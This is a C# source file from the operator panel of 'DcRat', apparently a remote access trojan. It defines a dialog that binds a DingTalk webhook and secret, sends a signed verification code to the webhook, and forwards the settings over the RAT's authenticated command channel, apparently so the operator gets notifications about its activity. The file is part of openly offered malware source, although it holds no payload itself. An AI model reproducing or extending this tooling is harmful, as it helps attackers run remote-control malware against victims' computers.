using System;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Web;
using System.Windows.Forms;
using DcRat.Properties;
using DcRat.TCPSocket;
using MessagePack;
using Microsoft.VisualBasic;

namespace DcRat.helpForms
{
    public partial class helperFormDingTalk : Form
    {
        public helperFormDingTalk()
        {
            InitializeComponent();
            SetTheme();
        }

        #region Theme

        private void SetTheme()
        {
            var darkTheme = Settings.Default.darkTheme;

            var colorSide = darkTheme ? Settings.Default.colorsidedark : Settings.Default.colorside;
            var colorText = darkTheme ? Settings.Default.colortextdark : Settings.Default.colortext;

            BackColor = colorSide;
            ForeColor = colorText;

            paneltop.BackColor = colorSide;
            labelDcRat.BackColor = colorSide;
            labelDcRat.ForeColor = colorText;
            buttonclose.BackColor = colorSide;

            buttonclose.Image = darkTheme ? Resources.close : Resources.close_dark;
            buttonok.ForeColor = colorText;
            buttonok.BackColor = colorSide;
        }

        #endregion

        #region Move
        [DllImport("user32.dll")]
        public static extern bool ReleaseCapture();
        [DllImport("user32.dll")]
        public static extern bool SendMessage(IntPtr hwnd, int wMsg, int wParam, int lParam);
        public const int WM_SYSCOMMAND = 0x0112;
        public const int SC_MOVE = 0xF010;
        public const int HTCAPTION = 0x0002;
        private void paneltop_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        private void labelDcRat_MouseDown(object sender, MouseEventArgs e)
        {
            ReleaseCapture();
            SendMessage(Handle, WM_SYSCOMMAND, SC_MOVE + HTCAPTION, 0);
        }
        #endregion

        private void buttonok_Click(object sender, EventArgs e)
        {
            try
            {
                if (string.IsNullOrEmpty(textBox1.Text) && string.IsNullOrEmpty(textBox2.Text))
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "Notify";
                    pack.ForcePathObject("Message").AsString = "DingTalk0";
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                }
                int random = new Random().Next(1000,9999);
                DingTalk(random.ToString());
                string Msgbox = Interaction.InputBox("Type in the verification code you receive", "Verification Code", "Code");
                if (Msgbox == random.ToString())
                {
                    MsgPack pack = new MsgPack();
                    pack.ForcePathObject("Packet").AsString = "Notify";
                    pack.ForcePathObject("Message").AsString = "DingTalk";
                    pack.ForcePathObject("WebHook").AsString = textBox1.Text;
                    pack.ForcePathObject("Secret").AsString = textBox2.Text;
                    MsgPack msgpack = new MsgPack();
                    msgpack.ForcePathObject("Type").AsString = "Controler";
                    msgpack.ForcePathObject("HWID").AsString = Setting.HWID;
                    msgpack.ForcePathObject("Password").AsString = Settings.Default.connectpassword;
                    msgpack.ForcePathObject("Msgpack").SetAsBytes(pack.Encode2Bytes());
                    ThreadPool.QueueUserWorkItem(Connection.Send, msgpack.Encode2Bytes());
                    MessageBox.Show("Binded");
                    Close();
                }
                else
                {
                    MessageBox.Show("Error,Try again!");
                }

            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }
        }

        public void DingTalk(string content)
        {
            TimeSpan ts = DateTime.Now - new DateTime(1970, 1, 1, 0, 0, 0, 0);
            long shijianchuo = ((DateTime.Now.ToUniversalTime().Ticks - 621355968000000000) / 10000);
            string stringToSign = shijianchuo + "\n" + textBox2.Text;
            var encoding = new ASCIIEncoding();
            byte[] keyByte = encoding.GetBytes(textBox2.Text);
            byte[] messageBytes = encoding.GetBytes(stringToSign);
            string sign;
            using (var hmacsha256 = new HMACSHA256(keyByte))
            {
                byte[] hashmessage = hmacsha256.ComputeHash(messageBytes);
                sign = HttpUtility.UrlEncode(Convert.ToBase64String(hashmessage), Encoding.UTF8);
            }
            string url = textBox1.Text + "&timestamp=" + shijianchuo + "&sign=" + sign;

            string json = "{\"msgtype\":\"text\",\"text\":{\"content\":\"" + content + "\"}}";
            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url);
            req.Method = "POST";
            req.ContentType = "application/json;charset=utf-8";

            var bytes = Encoding.UTF8.GetBytes(json);
            req.ContentLength = bytes.Length;
            using (Stream requestStream = req.GetRequestStream())
            {
                requestStream.Write(bytes, 0, bytes.Length);
            }

            HttpWebResponse resp = (HttpWebResponse)req.GetResponse();
            Stream stream = resp.GetResponseStream();
            using (StreamReader reader = new StreamReader(stream, Encoding.UTF8))
            {
                reader.ReadToEnd();
            }
        }

        private void buttonclose_Click(object sender, EventArgs e)
        {
            Close();
        }
    }
}
